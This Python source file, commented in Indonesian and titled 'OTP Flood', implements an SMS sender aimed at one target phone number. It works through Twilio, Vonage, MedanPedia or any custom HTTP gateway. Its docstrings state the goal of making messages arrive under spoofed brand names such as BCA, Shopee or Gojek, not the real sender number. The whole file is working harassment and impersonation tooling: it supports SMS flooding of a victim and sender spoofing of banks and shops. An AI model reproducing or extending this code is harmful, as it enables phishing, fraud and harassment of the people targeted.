"""
OTP Flood - SMS Sender with Alpha Sender ID
Pesan masuk di HP target tampil sebagai nama BRAND, bukan nomor pengirim
"""

import requests
import json
import os
import time
import urllib.parse


class SMSSender:
    """
    SMS Gateway sender with alpha sender ID (custom brand name).
    
    Pesan masuk akan muncul sebagai nama brand (BCA, Shopee, Gojek, dll)
    BUKAN nomor HP pengirim.
    
    Provider support:
    - Twilio (US/UK numbers, alpha sender need approval)
    - Vonage/Nexmo (alpha sender supported)
    - MedanPedia (Indonesia, alpha sender supported)
    - Custom API (any provider with HTTP API)
    """

    def __init__(self, target_number):
        self.target = self._format_number(target_number)
        self.sent_count = 0
        self.block_count = 0
        self.error_count = 0
        self.provider = os.environ.get("SMS_PROVIDER", "custom").lower()
        self.api_key = os.environ.get("SMS_API_KEY", "")
        self.api_url = os.environ.get("SMS_API_URL", "")
        self.username = os.environ.get("SMS_USERNAME", "")
        self.password = os.environ.get("SMS_PASSWORD", "")

    def _format_number(self, number):
        """Ensure number is in international format without +"""
        number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
        if number.startswith("0"):
            number = "62" + number[1:]
        return number

    def send(self, message, sender_name=""):
        """
        Send SMS with alpha sender ID (brand name).
        Target akan melihat pesan datang dari 'BCA', 'Shopee', dll.
        
        Returns: dict with status, code, message
        """
        # Use brand name as alpha sender
        alpha_sender = sender_name[:11] if sender_name else "OTP"  # Max 11 chars for alpha sender
        
        try:
            if self.provider == "twilio":
                result = self._send_twilio(message, alpha_sender)
            elif self.provider == "vonage":
                result = self._send_vonage(message, alpha_sender)
            elif self.provider == "medanpedia":
                result = self._send_medanpedia(message, alpha_sender)
            else:
                result = self._send_custom(message, alpha_sender)
            
            if result.get("status") == "sent":
                self.sent_count += 1
                return {
                    "status": "sent",
                    "code": 200,
                    "message": f"SMS terkirim sebagai [{alpha_sender}]",
                    "sent": True,
                    "sender_display": alpha_sender,
                }
            else:
                self.error_count += 1
                return {
                    "status": "error",
                    "code": result.get("code", 0),
                    "message": result.get("error", "Gagal kirim SMS"),
                    "sent": False,
                }
                
        except Exception as e:
            self.error_count += 1
            return {
                "status": "error",
                "code": 0,
                "message": str(e),
                "sent": False,
            }

    def _send_twilio(self, message, alpha_sender):
        """Send via Twilio API"""
        account_sid = self.username
        auth_token = self.api_key
        twilio_number = os.environ.get("SMS_FROM_NUMBER", "")
        
        url = f"https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Messages.json"
        
        data = {
            "To": f"+{self.target}",
            "Body": message,
        }
        
        # Twilio alpha sender (alphanumeric sender ID)
        if alpha_sender:
            data["MessagingServiceSid"] = ""  # Use alpha sender directly
            # Actually Twilio needs MessagingService with alpha sender configured
        
        # Fallback: use provided number
        if twilio_number:
            data["From"] = twilio_number
        else:
            data["From"] = alpha_sender
        
        try:
            resp = requests.post(url, auth=(account_sid, auth_token), data=data, timeout=15)
            if resp.status_code in (200, 201):
                return {"status": "sent"}
            return {"status": "error", "code": resp.status_code, "error": resp.text}
        except Exception as e:
            return {"status": "error", "error": str(e)}

    def _send_vonage(self, message, alpha_sender):
        """Send via Vonage/Nexmo API - supports alpha sender natively"""
        api_key = self.username or self.api_key
        api_secret = self.password or os.environ.get("SMS_API_SECRET", "")
        
        url = "https://rest.nexmo.com/sms/json"
        
        data = {
            "api_key": api_key,
            "api_secret": api_secret,
            "to": self.target,
            "text": message,
            "from": alpha_sender[:11],  # Max 11 chars for alpha
            "type": "unicode",
        }
        
        try:
            resp = requests.post(url, json=data, timeout=15)
            result = resp.json()
            messages = result.get("messages", [])
            if messages and messages[0].get("status") == "0":
                return {"status": "sent"}
            error = messages[0].get("error-text", "Unknown") if messages else "Unknown"
            return {"status": "error", "code": resp.status_code, "error": error}
        except Exception as e:
            return {"status": "error", "error": str(e)}

    def _send_medanpedia(self, message, alpha_sender):
        """Send via MedanPedia SMS API - Indonesia provider with alpha sender"""
        url = self.api_url or "https://mdpedia.com/api/sms.php"
        api_key = self.api_key
        
        params = {
            "api_key": api_key,
            "nohp": self.target,
            "pesan": message,
            "pengirim": alpha_sender[:11],  # Alpha sender
        }
        
        try:
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            resp = requests.post(url, data=params, headers=headers, timeout=15)
            text = resp.text.lower()
            if "sukses" in text or "success" in text or "terkirim" in text:
                return {"status": "sent"}
            return {"status": "error", "code": resp.status_code, "error": resp.text[:200]}
        except Exception as e:
            return {"status": "error", "error": str(e)}

    def _send_custom(self, message, alpha_sender):
        """Send via custom HTTP API - flexible for any provider"""
        url = self.api_url
        if not url:
            return {"status": "error", "error": "SMS_API_URL tidak dikonfigurasi"}
        
        # Build payload - support JSON and form-encoded
        payload = {
            "api_key": self.api_key,
            "to": self.target,
            "message": message,
            "sender": alpha_sender[:11],
            "from": alpha_sender[:11],
            "phone": self.target,
            "text": message,
            "type": "text",
            "unicode": "1",
        }
        
        headers = {"Content-Type": "application/json"}
        
        try:
            resp = requests.post(url, json=payload, headers=headers, timeout=15)
            
            # Flexible response parsing
            text = resp.text.lower()
            if resp.status_code in (200, 201):
                if any(ok in text for ok in ["sent", "sukses", "success", "ok", "terkirim", "message_id"]):
                    return {"status": "sent"}
                # Some providers return different success indicators
                if resp.status_code == 200:
                    return {"status": "sent"}
            
            return {"status": "error", "code": resp.status_code, "error": resp.text[:300]}
        except requests.exceptions.Timeout:
            return {"status": "error", "error": "Timeout - server tidak merespon"}
        except requests.exceptions.ConnectionError:
            return {"status": "error", "error": "Gagal koneksi ke server SMS"}
        except Exception as e:
            return {"status": "error", "error": str(e)}

    def get_stats(self):
        return {
            "target": self.target,
            "sent": self.sent_count,
            "blocked": self.block_count,
            "error": self.error_count,
        }


# Color helper for UI
class _color:
    RST = "\033[0m"
    DIM = "\033[2m"
    YLW = "\033[93m"
    GRN = "\033[92m"
    RED = "\033[91m"
    CYN = "\033[96m"
    B = "\033[1m"
